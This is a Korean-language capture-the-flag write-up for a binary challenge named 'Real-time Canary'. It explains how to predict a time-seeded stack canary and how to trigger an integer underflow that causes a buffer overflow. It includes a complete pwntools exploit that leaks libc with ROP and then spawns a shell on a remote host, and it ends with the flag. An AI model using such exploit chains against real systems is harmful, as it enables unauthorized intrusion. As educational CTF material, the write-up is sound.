```bash
[*] '/mnt/d/hk/_contest/2024JBU-CTF/Real-time Canary/challenge'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```
pie, canary가 없다.

challenge.c 파일이 주어지는 문제이다.
```C
#in main
srand(time(NULL));

#-----------------------------------------

void install(uint64_t *canary)
{
    *canary = 0;
    uint64_t tmp;
    for (int i = 0; i < 8; i++)
    {
        tmp = rand() % 0xff;
        *canary |= tmp << i * 8;
    }
        
    *canary &= 0xffffffffffffff00;
}

#------------------------------------------

void *guard(void *arg)
{
    uint64_t *canary = (uint64_t *)arg;
    uint64_t check = *canary;

    while (1)
    {
        if (check != *canary)
        {
            printf("\nerror\n");
            exit(1);
        }
    }
}
```
main함수를 실행하면 srand(time(NULL))을 통해 랜덤 함수를 초기화하고, canary를 생성한 뒤, 쓰레드를 생성해서 카나리가 변조되면 즉시 프로그램을 끈다.
그런데 srand(time(NULL)), rand()는 python 라이브러리 ctypes를 통해 완벽히 재현 가능하다. 리모트와의 시간차는 time에서의 offset을 조금 조정하다보면 쉽게 성공한다. 이렇게 카나리를 뚫을 수 있다.

```C
typedef struct
{
    char buf[0x2c];
    uint32_t size;
    uint64_t canary;

} Frame;

#-------------------------------------

#in main
case 2:
    printf("buf : ");
    scanf("%44s", frame.buf);
    while ((ch = getchar()) != '\n' && ch != EOF);
    
    printf("retry? ");
    scanf("%c", &c);
    while ((ch = getchar()) != '\n' && ch != EOF);
    
    if (c == 'y')
    {
        printf("buf : ");
        read(0, frame.buf, frame.size - 1);
    }
    
    break;
```

buf 바로 다음에 size가 있다. size는 초기에 0x2c로 초기화된다. scanf는 입력의 마지막에 NULL 값을 붙여준다. 따라서 첫 번째 입력에 44바이트를 다 채워서 보내면 size가 0이 되고, 두 번째 입력에서 Integer underflow에 의해 bof가 발생한다.
Ret2main으로 첫 번째 main에서는 libc_base를, 두 번째 main에서는 쉘을 따는 ROP를 진행한다.

# Exploit code
```python
from pwn import *
from ctypes import *

p = remote('44.210.9.208', 10011)
e = ELF('./challenge')
l = ELF('./libc-2.31.so')
lib = cdll.LoadLibrary('./libc-2.31.so')

canary = 0

def make_canary(offset: int):
    global canary
    canary = 0
    v0 = int(lib.time(0) + offset)
    lib.srand(v0)
    for i in range(8):
        tmp = lib.rand() % 0xff
        canary |= tmp << (i * 8)
    canary &= 0xffffffffffffff00

pop_rdi = 0x0000000000401673
main = 0x40142f
ret = 0x000000000040101a

def r(payload1: bytes, payload2: bytes):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'buf : ', payload1)
    p.sendlineafter(b'retry? ', b'y')
    p.sendlineafter(b'buf : ', payload2)

make_canary(0)
payload = b'a' * 48 + p64(canary) + b'a' * 8 + b'b' * 8 + p64(pop_rdi) + p64(e.got['puts']) + p64(e.sym['puts']) + p64(main)
r(b'a' * 44, payload)
p.sendlineafter(b'> ', b'3')
p.recvline()
l.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - l.sym['puts']
print(hex(l.address))

binsh = list(l.search(b'/bin/sh'))[0]
system = l.sym['system']

make_canary(0)
payload = b'a' * 48 + p64(canary) + b'a' * 8 + b'b' * 8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
r(b'a' * 44, payload)
p.sendlineafter(b'> ', b'3')
p.interactive()
```
`scpCTF{6N9Xf95ZkzkxFmOmGvSOoVDgANkAUy}`